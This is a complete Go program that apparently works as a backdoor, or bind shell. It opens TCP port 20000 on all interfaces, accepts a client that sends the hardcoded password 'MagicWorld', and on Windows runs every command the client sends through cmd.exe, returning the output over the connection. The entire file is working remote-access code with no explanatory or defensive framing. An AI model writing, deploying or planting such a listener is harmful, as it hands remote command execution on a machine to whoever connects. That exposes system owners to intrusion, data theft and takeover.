package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
)

func preAuth(conn net.Conn, key string) {
	var tmp [4096 * 100]byte
	var authKey string
	n, err := conn.Read(tmp[:])
	if err != nil {
		return
	}
	authKey = string(tmp[:n])
	if authKey == key {
		conn.Write([]byte("Success"))
		processConn(conn)
	} else {
		conn.Write([]byte("Failed"))
		return
	}

}

func processConn(conn net.Conn) {
	var tmp [4096 * 100]byte
	var command string
	for {
		n, err := conn.Read(tmp[:])
		if err != nil {
			return
		}
		command = string(tmp[:n])
		if command == "exit" {
			conn.Close()
			return
		}
		if runtime.GOOS == "windows" {
			result, err := exec.Command("cmd.exe", "/c", command).Output()
			if err != nil {
				fmt.Println("Error:", err)
				conn.Write([]byte(err.Error()))
			} else {
				// fmt.Println("Output:", string(result))
				conn.Write([]byte(string(result) + ";"))
			}
		}
	}
}

func main() {

	listener, err := net.Listen("tcp", "0.0.0.0:20000")
	key := "MagicWorld"
	if err != nil {
		fmt.Println("Start tcp server failed, err:", err)
		return
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Accept connection failed")
			return
		}
		go preAuth(conn, key)
	}

}
